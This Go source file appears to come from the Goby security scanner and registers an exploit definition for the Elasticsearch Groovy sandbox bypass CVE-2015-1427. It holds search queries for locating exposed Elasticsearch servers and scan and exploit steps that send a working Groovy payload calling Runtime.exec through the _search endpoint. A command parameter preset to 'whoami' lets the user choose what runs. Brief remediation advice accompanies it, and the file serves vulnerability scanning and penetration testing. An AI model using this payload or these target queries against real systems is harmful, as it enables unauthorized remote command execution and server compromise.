package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Elasticsearch Remote Code Execution (CVE-2015-1427)",
    "Description": "The Groovy script engine before Elasticsearch 1.3.8 and the Groovy script engine in 1.4.x before 1.4.3 allow remote attackers to bypass the sandbox protection mechanism and execute arbitrary shell commands through elaborate scripts.",
    "Impact": "Elasticsearch Remote Code Execution (CVE-2015-1427)",
    "Recommendation": "<p>Close the groovy sandbox to stop the use of dynamic scripts:</p>script.groovy.sandbox.enabled: false",
    "Product": "Elasticsearch",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution",
        "Advanced Persistent Threat"
    ],
    "Translation": {
        "CN": {
            "Name": "ElasticSearch Groovy沙盒绕过&&代码执行漏洞",
            "Description": "<p>ElasticSearch在2014年后脚本语言引擎换成了Groovy，并且加入了沙盒进行控制，危险的代码会被拦截，结果这次由于沙盒限制的不严格，导致远程代码执行。<br></p>",
            "Impact": "<p>攻击者可在服务器上执行任意命令，写入后门，从而入侵服务器，获取服务器的管理员权限，导致整个服务器被控制。</p>",
            "Recommendation": "<p>1、如非必要，禁止公网访问该服务。</p><p>2、关闭groovy script：<br></p><p>在elasticsearch.yml加script.groovy.sandbox.enabled: false</p><p>配置完需重启es服务。</p>",
            "Product": "Elasticsearch",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Elasticsearch Remote Code Execution (CVE-2015-1427)",
            "Description": "The Groovy script engine before Elasticsearch 1.3.8 and the Groovy script engine in 1.4.x before 1.4.3 allow remote attackers to bypass the sandbox protection mechanism and execute arbitrary shell commands through elaborate scripts.",
            "Impact": "Elasticsearch Remote Code Execution (CVE-2015-1427)",
            "Recommendation": "<p>Close the groovy sandbox to stop the use of dynamic scripts:<br></p><pre><code>script.groovy.sandbox.enabled: false<br></code></pre>",
            "Product": "Elasticsearch",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "Advanced Persistent Threat"
            ]
        }
    },
    "FofaQuery": "((((header=\"application/json\" && body=\"build_hash\") || (body=\"You Know, for Search\" && server!=\"DVRDVS-Webs\" && body!=\"<html\")) && header!=\"couchdb\" && header!=\"Drupal\" && body!=\"couchdb\") || protocol=\"elastic\" || header=\"realm=\\\"ElasticSearch\" || banner=\"realm=\\\"ElasticSearch\" || (cert=\"CommonName: elasticsearch\" && (banner=\"realm=\\\"security\" || header=\"realm=\\\"security\")))",
    "GobyQuery": "((((header=\"application/json\" && body=\"build_hash\") || (body=\"You Know, for Search\" && server!=\"DVRDVS-Webs\" && body!=\"<html\")) && header!=\"couchdb\" && header!=\"Drupal\" && body!=\"couchdb\") || protocol=\"elastic\" || header=\"realm=\\\"ElasticSearch\" || banner=\"realm=\\\"ElasticSearch\" || (cert=\"CommonName: elasticsearch\" && (banner=\"realm=\\\"security\" || header=\"realm=\\\"security\")))",
    "Author": "zhzyker",
    "Homepage": "https://www.elastic.co/cn/elasticsearch/",
    "DisclosureDate": "2021-04-11",
    "References": [
        "https://github.com/zhzyker"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2015-1427"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/website/blog/",
                "follow_redirect": true,
                "header": {
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "close",
                    "Accept-Language": "en",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "{ \"name\": \"cve-2015-1427\" }"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "201",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/_search?pretty",
                "follow_redirect": true,
                "header": {
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "close",
                    "Accept-Language": "en",
                    "Content-Type": "application/text"
                },
                "data_type": "text",
                "data": "{\"size\":1, \"script_fields\": {\"lupin\":{\"lang\":\"groovy\",\"script\": \"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"echo 460f7ccb583e25e09c0fe100a2c9e90d\\\").getText()\"}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "460f7ccb583e25e09c0fe100a2c9e90d",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/website/blog/",
                "follow_redirect": true,
                "header": {
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "close",
                    "Accept-Language": "en",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "{ \"name\": \"cve-2015-1427\" }"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "201",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/_search?pretty",
                "follow_redirect": true,
                "header": {
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "close",
                    "Accept-Language": "en",
                    "Content-Type": "application/text"
                },
                "data_type": "text",
                "data": "{\"size\":1, \"script_fields\": {\"lupin\":{\"lang\":\"groovy\",\"script\": \"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"echo 460f7ccb583e25e09c0fe100a2c9e90d\\\").getText()\"}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "460f7ccb583e25e09c0fe100a2c9e90d",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
